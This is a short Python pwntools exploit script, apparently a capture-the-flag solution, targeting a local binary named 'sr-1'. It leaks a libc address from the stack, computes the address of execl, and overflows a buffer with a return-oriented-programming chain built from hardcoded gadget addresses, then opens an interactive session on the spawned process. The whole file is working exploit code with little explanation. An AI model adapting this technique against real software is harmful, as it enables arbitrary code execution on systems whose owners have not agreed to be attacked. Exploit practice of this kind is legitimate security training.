#!/usr/bin/env python

from pwn import *
import os

p = process('./sr-1')

"""
context.terminal = ['tmux', 'splitw', '-h']
p = process('./sr-x')
gdb.attach(p)
"""

#raw_input()

print(p.recv())

p.sendline(str(0xc0))
ebp = -0x80
count = 0x0

#data = p.recv(0x38, timeout=0.1)
#print(data)
#libcMain = u64(data[0x30:])
#print(hex(libcMain))

data = p.recv(8, timeout=0.1)

while data != '':
    space = " " * (4 - len(hex(count)))
    spaces = " " * (5 - len(hex(ebp)))
    print("{count}{space}:\tebp{val1}{spaces}:\t{val2}".format(space=space, count=hex(count), spaces=spaces, val1=hex(ebp), val2=hex(u64(data))))
    if count is 0xb8:
        libcMain = u64(data)
        break
    data = p.recv(8, timeout=0.1)
    ebp += 0x8
    count += 0x8

"""
0x7ffc9ed83e08 0x7fe0e378b830 (__libc_start_main+240)
0xb8:  ebp0x38:    0x7fe0e378b830
$1 = {<text variable, no debug info>} 0x7fe0e3837a20 <__GI_execl>
"""

print("libcMain: " + hex(libcMain))

offset = 0x7fe0e3837a20 - 0x7fe0e378b830

execl = offset + libcMain

print("Offset:" + hex(offset))
print("execl: " + hex(execl))

"""
0x400178:       "D"
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
"""
pop_rdi = p64(0x400783)
pop_rsi_r15 = p64(0x400781)
string = p64(0x400178)

buf = "A" * 0x88
buf += pop_rdi
buf += string
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += p64(execl)

with open("buf.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
p.interactive()
